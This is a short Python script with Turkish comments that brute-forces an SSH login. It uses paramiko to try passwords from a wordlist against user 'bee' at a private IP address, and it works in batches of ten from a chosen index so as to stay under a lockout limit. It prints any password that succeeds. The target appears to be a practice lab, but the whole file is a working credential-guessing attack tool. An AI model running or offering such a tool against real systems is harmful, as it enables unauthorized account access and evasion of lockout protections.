import paramiko
import argparse
#=====================
parser = argparse.ArgumentParser(description='başlangıç indexi',usage="tool kullanım rehberi")
parser.add_argument("-b", "--baslangic", metavar="", type=int, help="baslangic indexini gir")
args = parser.parse_args()
#====================
with open(r"C:\Users\ogulc\OneDrive\Masaüstü\visual\ssh\wordlist.txt","r",encoding="utf8") as şifre:
    şifreler = şifre.read().splitlines()
#====================
def bağlan(başla):
    dur = başla+9 # 10 deneme hakkımız oldugu icin verilen başla değerine 9 ekliyorum ve kodun ne zaman durması gerektigini dur adlı bir değişkene atıyorum
    username = "bee"
    ssh = paramiko.SSHClient() # ssh sunucusuna bağlanmak icin ssh nesnesi oluşturuyorum
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for index in range(len(şifreler)):
        
        index = index+başla # fonksiyona verilen başla değerinden itibaren şifreleri deniycez
        
        try:
            # yanlış bir şifre girdiğimizde hata çıktısı veriyor bu yüzden şifre denememizi try except bloklarında yapıyoruz
            # ssh sunucusuna bağlanmaya çalışıyoruz eğer bağlandıysak bir hata çıkartmaz ve aşağıdaki kodlar çalışır bağlanamadıysak except bölümü çalışır
            ssh.connect("192.168.1.39",username=username,password=şifreler[index]) 
            print("şifre :",şifreler[index]) # şifre bulunduysa şifreyi yazdırıyoruz
            ssh.close() # şifre bulunduğu için ssh nesnesini kapatıyoruz
            break # döngüyü sonlandırıyoruz

        except:
            print(f"----------{index}. index-----------")
            pass
        
        if index == dur: # 9 şifre denemesi yapıldıysa döngüyü sonlandırıyoruz
            ssh.close() # ssh nesnesini kapatıyoruz
            break # döngüyü sonlandırıyoruz

başla = args.baslangic # parametre olarak girecegimiz sayı
bağlan(başla) # fonksiyonu başlatıyoruz
#=====================
